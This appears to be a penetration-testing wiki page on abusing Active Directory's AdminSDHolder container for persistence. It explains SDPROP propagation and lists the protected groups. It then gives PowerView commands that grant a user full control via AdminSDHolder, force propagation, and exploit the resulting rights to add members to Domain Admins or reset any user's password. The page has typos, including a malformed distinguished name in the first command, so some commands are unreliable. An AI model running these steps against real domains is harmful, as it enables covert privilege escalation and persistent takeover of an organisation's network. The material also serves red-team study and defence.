---
description: AdminSDHolder
---

# AdminSDHolder

> AdminSDHolder is a special container used to control the permissions of the "protected groups". Every 60 minutes (by default), a process called SDPROP compares the ACL of the AdminSDHolder object with the "protected groups" and any difference is overwritten.

If we modify the ACL of AdminSDHolder, at the next propagation it will distribute to all the "protected groups".

List of protected groups:

* Account Operators
* Backup Operators
* Server Operators
* Print Operators
* Domain Admins
* Replicator
* Enterprise Admins
* Domain Controllers
* Read Only Domain Controllers
* Schema Admins
* Administrators

Instead of adding a user into the "Domain Admins" group, we can add the uer full control over the "Domain Admins" group, meaning that without being member of that group, we can add/remove users into it.

### AdminSDHolder process

1. Add FullControl permissions for a user to the AdminSDHolder (requieres domain admin privs):

```bash
Add-ObjectAcl -TargetADSPrefix 'CN=AdminSDHolder,CN)System' -PrincipalSamAccountName $USER_NAME -Rights All -Verbose #We can change rights to: ResetPassword, WriteMembers...
```

1. Make the propagation happen instantly (to not wait 60 minutes):

```bash
$sess = New-PSSession -ComputerName $DC_HOSTNAME
Invoke-Command -FilePath .\Invoke-SDPropagator.ps1 -Session $sess
Enter-PSSession -Session $sess
PS> Invoke-SDPropagator -ShowProgress -TimeoutMinutes 1
```

1. Check the ACLs of the Domain Admins group using a regular user (PowerView):

```bash
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentitiyPreference -match '$USERNAME'}
```

***

### Abusing FullControl

Once we have added the user into the ACL of AdminSDHolder (-Rights All) we can do:

```bash
#Using PowerView_dev:
Add-DomainGroupMember -Identity 'Domain Admins' -Member $USERNAME -Verbose #Add a user into the Domain Admins group
```

### Abusing ResetPassword

Once we have added the user into the ACL of AdminSDHolder (-Rights ResetPassword) we can do:

```bash
Set-DomainUserPassword -Identity $USERNAME -AccountPassword (Convert-SecureString "Password123" -AsPlainText -Force) -Verbose #Change password of any user.
```
